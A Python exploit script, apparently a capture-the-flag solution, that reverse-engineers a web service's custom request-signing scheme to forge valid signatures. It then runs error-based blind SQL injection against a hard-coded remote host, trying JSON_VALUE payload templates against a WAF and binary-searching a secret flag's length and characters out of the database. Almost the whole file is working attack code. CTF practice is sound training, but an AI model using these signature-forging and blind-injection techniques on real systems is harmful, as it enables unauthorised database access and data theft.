import base64
import json
import sys
import requests

# BASE = "http://127.0.0.1:8080"
BASE = "http://101.245.108.250:10001"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

SALT_SEED = 0xA3B1C2D3
SALT_MSG = 0x1F2E3D4C
SALT_UA = 0xB16B00B5
SALT_PERM = 0xC0DEC0DE
WINDOW_MS = 30000


def b64u_decode(s: str) -> bytes:
    pad = "=" * ((4 - len(s) % 4) % 4)
    return base64.urlsafe_b64decode(s + pad)


def b64u_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def rotl32(x: int, r: int) -> int:
    r %= 32
    return ((x << r) | (x >> (32 - r))) & 0xFFFFFFFF


def kdf_table(salt: int, n: int) -> list[int]:
    out = [0] * 16
    x = (salt ^ ((n * 0x9E3779B9) & 0xFFFFFFFF)) & 0xFFFFFFFF
    for i in range(16):
        x ^= (x << 13) & 0xFFFFFFFF
        x ^= (x >> 17) & 0xFFFFFFFF
        x ^= (x << 5) & 0xFFFFFFFF
        out[i] = (x + (i * 0x85EBCA6B)) & 0xFFFFFFFF
    return out


def kdf(data: bytes, salt: int) -> bytes:
    tab = kdf_table(salt, len(data))
    h = (0x811C9DC5 ^ salt ^ tab[len(data) & 15]) & 0xFFFFFFFF
    for i, c in enumerate(data):
        h ^= (c + tab[i & 15]) & 0xFFFFFFFF
        h = (h * 0x01000193) & 0xFFFFFFFF
        if (tab[(i + 3) & 15] & 1) == 1:
            h ^= (h >> 13)
        if (tab[(i + 7) & 15] & 2) == 2:
            h = rotl32(h, tab[i & 15] & 7)
    x = (h ^ salt ^ tab[(len(data) + 7) & 15]) & 0xFFFFFFFF
    if (tab[1] & 4) == 4:
        x ^= rotl32(x, tab[2] & 15)
    out = bytearray(32)
    for i in range(8):
        x ^= (x << 13) & 0xFFFFFFFF
        x ^= (x >> 17) & 0xFFFFFFFF
        x ^= (x << 5) & 0xFFFFFFFF
        x = (x + ((i * 0x9E3779B9) & 0xFFFFFFFF) + salt + tab[i & 15]) & 0xFFFFFFFF
        out[i * 4 : i * 4 + 4] = x.to_bytes(4, "little")
    if (tab[0] & 1) == 1:
        _ = kdf_table(salt ^ 0xA5A5A5A5, len(data) + 3)
    return bytes(out)


def rot_words(buf: bytes, r: int) -> bytes:
    out = bytearray(32)
    for i in range(8):
        w = int.from_bytes(buf[i * 4 : i * 4 + 4], "little")
        w = rotl32(w, r)
        out[i * 4 : i * 4 + 4] = w.to_bytes(4, "little")
    return bytes(out)


def xor32(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def permute(b: bytearray) -> None:
    for i in range(8):
        w = int.from_bytes(b[i * 4 : i * 4 + 4], "little")
        w = rotl32(w, (i * 7 + 3) % 31)
        b[i * 4 : i * 4 + 4] = w.to_bytes(4, "little")


def permute_inv(b: bytearray) -> None:
    for i in range(8):
        w = int.from_bytes(b[i * 4 : i * 4 + 4], "little")
        w = rotl32(w, -((i * 7 + 3) % 31))
        b[i * 4 : i * 4 + 4] = w.to_bytes(4, "little")


def ua_mix_key(ua: str, salt: str, ts: int) -> bytes:
    if not ua:
        ua = "ua/empty"
    bucket = str(ts // WINDOW_MS)
    msg_a = f"{ua}|{salt}|{bucket}".encode()
    msg_b = f"{bucket}|{salt}|{ua}".encode()
    msg_c = f"{ua}|{bucket}".encode()
    a = kdf(msg_a, SALT_UA)
    b = kdf(msg_b, SALT_UA ^ 0x13579BDF)
    c = kdf(msg_c, SALT_UA ^ 0x2468ACE0)
    mix = xor32(a, rot_words(b, 5))
    mix = xor32(mix, rot_words(c, 11))
    if len(ua) % 7 == 3:
        fake = kdf(f"x|{ua}|{salt}".encode(), 0xDEADBEEF)
        mix = xor32(mix, rot_words(fake, 7))
    return mix


def seed_pack_params(nonce: str, salt: str, ts: int):
    bucket = str(ts // WINDOW_MS)
    msg = f"{nonce}|{salt}|{bucket}".encode()
    k = kdf(msg, SALT_PERM)
    pad_l = [k[i] % 5 for i in range(4)]
    pad_r = [k[i + 4] % 5 for i in range(4)]
    mask = [k[i + 8] for i in range(4)]
    idx = [0, 1, 2, 3]
    pos = 12
    for i in range(3, 0, -1):
        j = k[pos] % (i + 1)
        idx[i], idx[j] = idx[j], idx[i]
        pos += 1
    return idx, pad_l, pad_r, mask


def unpack_seed(seed_pack: str, nonce: str, salt: str, ts: int) -> bytes:
    parts = seed_pack.split(".")
    if len(parts) != 4:
        raise ValueError("bad seed pack")
    perm, pad_l, pad_r, mask = seed_pack_params(nonce, salt, ts)
    chunks = [b"", b"", b"", b""]
    for i, p in enumerate(parts):
        b = b64u_decode(p)
        idx = perm[i]
        exp = pad_l[idx] + pad_r[idx] + 8
        if len(b) != exp:
            raise ValueError("bad chunk")
        data = bytearray(b[pad_l[idx] : pad_l[idx] + 8])
        for j in range(8):
            data[j] ^= (mask[idx] + (j * 17)) & 0xFF
        chunks[idx] = bytes(data)
    return b"".join(chunks)


def sign_request(method: str, path: str, q: str, nonce: str, ts: int, seed_pack: str, salt: str, ua: str) -> str:
    nb = b64u_decode(nonce)
    k1 = kdf(nb + ts.to_bytes(8, "little") + b"k9v3_suctf26_sigma", SALT_SEED)
    seed_x = bytearray(unpack_seed(seed_pack, nonce, salt, ts))
    dyn = ua_mix_key(ua, salt, ts)
    permute_inv(seed_x)
    seed = xor32(bytes(seed_x), dyn)
    secret = xor32(seed, k1)
    secret2 = xor32(secret, dyn)
    msg = f"{method}|{path}|{q}|{ts}|{nonce}".encode()
    m = kdf(msg, SALT_MSG)
    out = bytearray(xor32(secret2, m))
    permute(out)
    return b64u_encode(bytes(out))


def get_material(session: requests.Session) -> dict:
    r = session.get(f"{BASE}/api/sign", headers={"User-Agent": UA})
    r.raise_for_status()
    j = r.json()
    if not j.get("ok"):
        raise RuntimeError(j.get("error"))
    return j["data"]


def do_query(session: requests.Session, payload: str) -> tuple[int, dict]:
    mat = get_material(session)
    sig = sign_request("POST", "/api/query", payload, mat["nonce"], mat["ts"], mat["seed"], mat["salt"], UA)
    body = {"q": payload, "nonce": mat["nonce"], "ts": mat["ts"], "sign": sig}
    r = session.post(
        f"{BASE}/api/query",
        headers={"User-Agent": UA, "Content-Type": "application/json"},
        data=json.dumps(body),
    )
    try:
        data = r.json()
    except Exception:
        data = {"ok": False, "error": r.text}
    return r.status_code, data


TEMPLATES = [
    "' || (SELECT CASE WHEN ({cond}) THEN JSON_VALUE('{{\"a\":\"x\"}}','$.a' RETURNING INTEGER ERROR ON ERROR) ELSE 0 END) || '",
    "' || (SELECT CASE WHEN ({cond}) THEN JSON_VALUE('{{\"a\":\"x\"}}','$.a' RETURNING INTEGER ON ERROR ERROR) ELSE 0 END) || '",
]


def inj_payload(cond: str, template: str) -> str:
    return template.format(cond=cond)


def is_error(resp: tuple[int, dict]) -> bool:
    status, data = resp
    if status != 200:
        raise RuntimeError(f"HTTP {status}: {data}")
    if data.get("error") == "blocked":
        raise RuntimeError("WAF blocked payload")
    return not data.get("ok", False)


def pick_template(session: requests.Session) -> str:
    for tpl in TEMPLATES:
        p_true = inj_payload("1=1", tpl)
        p_false = inj_payload("1=0", tpl)
        if len(p_true) > 256:
            continue
        err_true = is_error(do_query(session, p_true))
        err_false = is_error(do_query(session, p_false))
        if err_true != err_false:
            return tpl
    raise RuntimeError("no working JSON error template")


def check_cond(session: requests.Session, cond: str, template: str) -> bool:
    payload = inj_payload(cond, template)
    if len(payload) > 256:
        raise RuntimeError("payload too long")
    return is_error(do_query(session, payload))


def get_length(session: requests.Session, template: str, max_len: int = 64) -> int:
    lo, hi = 1, max_len
    while lo <= hi:
        mid = (lo + hi) // 2
        cond = f"length((select flag from secrets limit 1))>{mid}"
        if check_cond(session, cond, template):
            lo = mid + 1
        else:
            hi = mid - 1
    return lo


def get_char(session: requests.Session, template: str, pos: int) -> str:
    lo, hi = 32, 126
    while lo <= hi:
        mid = (lo + hi) // 2
        cond = f"ascii(substr((select flag from secrets limit 1),{pos},1))>{mid}"
        if check_cond(session, cond, template):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)


def main():
    session = requests.Session()
    template = pick_template(session)
    length = get_length(session, template, max_len=96)
    out = []
    for i in range(1, length + 1):
        ch = get_char(session, template, i)
        out.append(ch)
        sys.stdout.write("\r" + "".join(out))
        sys.stdout.flush()
    print("\n")


if __name__ == "__main__":
    main()
